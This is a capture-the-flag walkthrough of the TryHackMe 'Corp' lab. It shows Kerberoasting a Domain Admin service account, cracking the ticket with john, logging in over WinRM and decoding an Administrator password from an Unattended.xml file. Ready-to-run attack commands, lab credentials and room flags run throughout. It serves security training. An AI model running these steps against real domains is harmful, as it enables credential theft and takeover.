# THM Corp

> **Platform:** TryHackMe — https://tryhackme.com/room/corp
> **OS:** Windows (Active Directory)
> **Domain:** `corp.local` — host `OMEGA`
> **Assumed-breach start:** RDP credentials `corp\dark : _QuejVudId6` are provided.

> **Note on the target IP:** TryHackMe VPN — the address changed from `10.48.150.166` to `10.49.145.254` across the session. Substitute your own.

## Attack Path Overview

1. **Recon** – minimal DC surface (no 80/389/5985 on the full scan; RDP open).
2. **Kerberoasting (as `dark`)** – the SPN account `fela` is a **Domain Admin**; crack its ticket → `rubenF124`.
3. **Foothold** – WinRM as `fela` → user flag.
4. **Administrator** – `C:\Windows\Panther\Unattend\Unattended.xml` holds a base64 AutoLogon password for `Administrator` → WinRM → root flag.

Starting credentials:

```
rdp
Username: corp\dark  
Password: _QuejVudId6
```

---

Domain `corp.local`, host `OMEGA`. We already have creds, so RDP in and map the domain:

```bash
xfreerdp /v:10.48.150.166 /u:dark@corp.local /p:_QuejVudId6 /cert:ignore /dynamic-resolution
bloodhound-python -u dark -p '_QuejVudId6' -d corp.local -ns 10.48.150.166 -c All
```

## 2. Kerberoasting → `fela` (Domain Admin)

Any authenticated user can request TGS tickets for SPN accounts. Request them as `dark`:

```bash
impacket-GetUserSPNs -request -dc-ip 10.49.145.254 corp.local/dark
```

> Note both the `ServicePrincipalName` **and** the account `Name` / `MemberOf` — `fela` is in **Domain Admins**, so cracking it wins the domain outright.

```
ServicePrincipalName  Name  MemberOf                                    PasswordLastSet             LastLogon                   Delegation 
--------------------  ----  ------------------------------------------  --------------------------  --------------------------  ----------
HTTP/fela             fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 13:54:40.905204  2019-10-10 23:39:12.562404             
HOST/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 13:54:40.905204  2019-10-10 23:39:12.562404             
HTTP/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 13:54:40.905204  2019-10-10 23:39:12.562404             

$krb5tgs$23$*fela$CORP.LOCAL$corp.local/fela*$dc9893ff809f8889cf9561a9642a8943$
```

Crack the TGS:

```bash
nano hello
john --format=krb5tgs hello --wordlist=/usr/share/wordlists/rockyou.txt
```

```
rubenF124        (?)     
1g 0:00:00:02 DONE (2026-10-23 08:36) ...
```

```
fela : rubenF124
```

## 3. Foothold — WinRM as `fela`

```bash
evil-winrm -u fela -p rubenF124 -i 10.49.145.254
```

```
*Evil-WinRM* PS C:\Users\fela.CORP\Desktop> cat flag.txt
flag{bde1642535aa396d2439d86fe54a36e4}
```

```
user flag : flag{bde1642535aa396d2439d86fe54a36e4}
```

## 4. Administrator — Unattend.xml AutoLogon

Unattended-install files leave AutoLogon secrets behind. Read the Panther answer file:

```powershell
cat C:\Windows\Panther\Unattend\Unattended.xml
```

```xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```

The `<Value>` is base64 (decoded in CyberChef):

```
dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=   →   tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

```
Administrator : tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

Log in as Administrator and grab the root flag:

```bash
evil-winrm -u Administrator -p 'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' -i 10.49.145.254
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
THM{g00d_j0b_SYS4DM1n_M4s73R}
```

```
root flag : THM{g00d_j0b_SYS4DM1n_M4s73R}
```

---

## Credential Summary

| Account         | Secret                              | How obtained                         |
| --------------- | ----------------------------------- | ------------------------------------ |
| `dark`          | `_QuejVudId6`                       | Provided (assumed breach)            |
| `fela` (DA)     | `rubenF124`                         | Kerberoast + crack                   |
| `Administrator` | `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T`  | Unattended.xml AutoLogon (base64)    |

## Lessons Learned

- **Always read `MemberOf` in `GetUserSPNs` output** — here the Kerberoastable `fela` was already a Domain Admin, so cracking it ended the engagement.
- **Kerberoasting only needs one authenticated user** (`dark`) to request every SPN ticket in the domain.
- **Unattended-install files** (`C:\Windows\Panther\Unattend*.xml`, `sysprep.xml`) routinely contain AutoLogon credentials — base64, not encryption, so decode and use them.
